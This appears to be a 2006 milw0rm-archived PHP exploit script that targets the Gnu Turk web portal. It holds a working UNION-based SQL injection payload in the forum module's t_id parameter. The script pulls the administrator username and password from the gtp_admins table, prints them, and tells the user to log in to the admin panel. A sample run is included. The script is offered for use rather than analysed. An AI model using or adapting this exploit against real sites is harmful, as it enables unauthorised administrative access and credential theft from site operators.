<?
/*
------------------------------------------------------------------------------------------------------------
--------Gnu turk all versions simple get admin uname & pass without hash blind sql injection exploit---------------
                             -------------Powered by p2y ---------------
                    ---------------Use it at ur own RisK :P :D ----------------------
------------------------------------------------------------------------------------------------------------




p2y@p2y:~/Desktop/projects$ php gnuturk.php 127.0.0.1 /portals/gnuturk/ 1

--------------------------------
Powered by p2y
Admin username : p2y
Admin password : sanane
N0w go 2 http://127.0.0.1/portals/gnuturk/admin/ and login with this inf0rmation
Cuz n0where is Secure En0ugh ...
--------------------------------


*/
//simple get admin username && pass exploit by p2y
error_reporting(0);
$site=$argv[1];
$path=$argv[2];
$id=$argv[3];

if($site && $path && $id)
{
if(!ereg("http",$site)) $site="http://".$site;

$sql="mods.php?go=Forum&p=vtop&t_id=-2%20Union/**/Select/**/1,2,username,password,5,6,7,8,9/**/From/**/gtp_admins/**/WHERE/**/id=$id/*";
$url=$site.$path.$sql;

$html=file_get_contents($url);
$tmp=explode("/*>",$html);
$rtmp=explode("</a>",$tmp[1]);
$a_username=$rtmp[0];



$tmp=explode('<td class="forum_msg" valign="top">',$html);
$rtmp=explode("</td>",$tmp[1]);
$a_pass=$rtmp[0];
 

echo "--------------------------------\n";
echo "Powered by p2y\n";
echo "Admin username : $a_username\n";
echo "Admin password : $a_pass\n";
echo "N0w go 2 $site$path"."admin/ and login with this inf0rmation\n";
echo "Cuz n0where is Secure En0ugh ...\n";
echo "--------------------------------\n";



}
else
{

echo "--------------------------------\n";
echo "Powered by p2y\n";
echo "Enter host path admin id\n";
echo "usage = php p2y.php 127.0.0.1 /gnu/ 1\n";
echo "Cuz n0where is Secure En0ugh ...\n";
echo "--------------------------------\n";


}

?>

# milw0rm.com [2006-09-16]
